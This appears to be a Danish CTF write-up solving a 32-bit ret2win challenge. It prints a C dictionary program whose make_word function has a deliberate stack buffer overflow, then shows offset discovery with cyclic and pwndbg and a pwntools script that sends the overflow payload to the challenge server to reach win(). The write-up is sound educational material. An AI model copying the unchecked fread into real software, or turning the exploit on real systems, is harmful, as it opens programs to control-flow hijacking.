---
title: Fear Of Long Words
ctf: DDC Qualifiers
challenge_name: Fear Of Long Words
category: Binary Exploitation
date: 2026-03-23
tags:
  - ctf
  - writeup
  - pwn
status: draft
tools: []
techniques: []
vuln: ""
slug: fear-of-long-words
---

# Fear Of Long Words

## Challenge beskrivelse

Jeg har lavet en ordbog i C! Gider du teste den for mig?

Man kan tilføje ord med add kommandoen, og man kan vise ordene i ordbogen med kommandoen show.

Jeg er helt ny til C, så det er det eneste den kan. Du må leve med, at ordene ikke kan have betydning.

Både mig og mit program har hippopotomonstrosesquippedaliofobi, så vær sød at respektere dette :)  
Derfor er programmet også 32-bit. 64 er simpelthen for mange bits!!


## Challenge handout
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
char dictionary[1024];
int dict_len = 0;


void win() {
  char flag[100];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
      printf("Flag file is missing.\n");
      exit(1);
  }
  fgets(flag, 100, f);
  printf("Congratulations! Here is your flag: %s\n", flag);
  fclose(f);
}

char *make_word(int length) {
    char buffer[64]; // No way a word can be longer than this, right?

    if (length <= 0) {
        printf("Word length must be positive.\n");
        return NULL;
    }

    printf("Enter word:\n");
    fread(buffer, 1, length, stdin);
    char *word = malloc(length + 1);
    memcpy(word, buffer, length);
    word[length] = '\0';
    return word;
}

void add_to_dictionary(const char *word, int length) {
    if (!word) return;

    if (dict_len + length + 1 >= sizeof(dictionary)) {
        printf("Dictionary is full!\n");
        return;
    }

    memcpy(&dictionary[dict_len], word, length);
    dict_len += length;
    dictionary[dict_len++] = '\n';
}

void show() {
    if (dict_len == 0) {
        printf("dictionary is empty! Add some words!\n");
        return;
    }
    printf("\n--- Dictionary ---\n");
    fwrite(dictionary, 1, dict_len, stdout);
    printf("------------------\n");
}

int main() {
    setbuf(stdout, NULL);
    printf("I made a dictionary!\n");
    printf("Commands: add <length>, show, exit\n");
    char input[64];


    while (1) {
        printf("\n> ");

        if (!fgets(input, sizeof(input), stdin))
            break;

        input[strcspn(input, "\n")] = '\0';

        if (strcmp(input, "exit") == 0) break;

        else if (strncmp(input, "add ", 4) == 0) {
            int len = atoi(input + 4);

            char *word = make_word(len);
            add_to_dictionary(word, len);     
            free(word);
        }

        else if (strcmp(input, "show") == 0) {
            show();
        }

        else {
            printf("Commands: add <length>, show, exit\n");
        }
    }
}
```


## Løsning af challenge
Da det er en kvalifikationsopgave, så PIE nok ikke blevet brugt under compiling. Dog tjekkes dette først.
```bash
┌──(kali㉿kali)-[~/Desktop/fear of long words]
└─$ checksec ordbog         
[*] '/home/kali/Desktop/fear of long words/ordbog'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
Der er altså ingen PIE, og derfor er offset'et det samme på serveren som lokalt. Offset'et kan nu findes ved at bruge `cyclic -n 4 150` og så debug programmet med`pwndbg`. Der blev dernæst valgt `add word 150` og dernæst den cykliske streng. Dette gav en Segment Fault. 

Dernæst blev backtrace'n printet med `bt` kommandoen.
```
pwndbg> bt
#0  0xf7eef1f3 in ?? () from /usr/lib32/libc.so.6
#1  0xf7ffcc60 in ?? () from /lib/ld-linux.so.2
#2  0x61616175 in ?? ()
```

Som det ses er frame 2, så ser det meget cyklisk ud. Ved brugen af `cyclic -l 0x61616175`, så fås offset'et til at være 80.

Dernæst skal adressen for funktionen blot findes. Dette kan også gøres med `pwndbg`.
```bash
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08049256  win
0x080492e4  make_word
0x08049380  add_to_dictionary
0x08049412  show
0x0804948c  main
```
`win` adressen ligger altså på adressen `0x08049256`

Et løsningsscript kan nu sættes sammen med de fundne værdier, ved brugen af Python-biblioteket `pwntools`: 

```python
#!/usr/bin/env python3
from pwn import *
r = remote('fear-of-long-words-5045f44d.camp02.c4mp.site', 1337, ssl=True)

offset = b"A"* (80) # offset = 80

ret2win_addr = p64(0x08049256) # Functions address
payload = [
    offset,
    ret2win_addr
]

payload = b"".join(payload)
r.recvuntil(b"> ")
r.sendline(b"add "+str(len(payload)).encode())
r.recvuntil(b"Enter word:")
r.sendline(payload)
r.interactive()


```
Dette gav flaget: 

DDC{D3m0n1c_d1ct1on4ry_d3str0y3r}